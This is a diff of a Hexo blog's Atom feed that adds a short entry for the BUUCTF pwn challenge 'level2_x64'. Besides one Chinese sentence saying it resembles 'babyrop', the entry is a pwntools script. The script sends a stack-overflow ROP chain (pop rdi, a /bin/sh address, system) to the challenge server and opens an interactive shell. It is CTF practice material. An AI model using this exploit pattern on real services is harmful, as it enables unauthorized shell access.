@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-16T13:39:53.389Z</updated>
+  <updated>2022-01-16T13:54:33.781Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-level2_x64</title>
+    <link href="http://example.com/2022/01/16/buuctf-level2-x64/"/>
+    <id>http://example.com/2022/01/16/buuctf-level2-x64/</id>
+    <published>2022-01-16T13:53:58.000Z</published>
+    <updated>2022-01-16T13:54:33.781Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h1><p>这题其实跟babyrop这题差不多的原理,详细的我就不多说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./level2_x64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25435</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr =<span class="number">0x0000000000400603</span> </span><br><span class="line">bin_sh = <span class="number">0x0000000000600A90</span></span><br><span class="line">pop_rdi =<span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;level2-x64&quot;&gt;&lt;a href=&quot;#level2-x64&quot; class=&quot;headerlink&quot; title=&quot;level2_x64&quot;&gt;&lt;/a&gt;level2_x64&lt;/h1&gt;&lt;p&gt;这题其实跟babyrop这题差不多的原理,详细的我就不多说了&lt;/p&gt;
+&lt;fi</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-[HarekazeCTF2019]baby_rop</title>
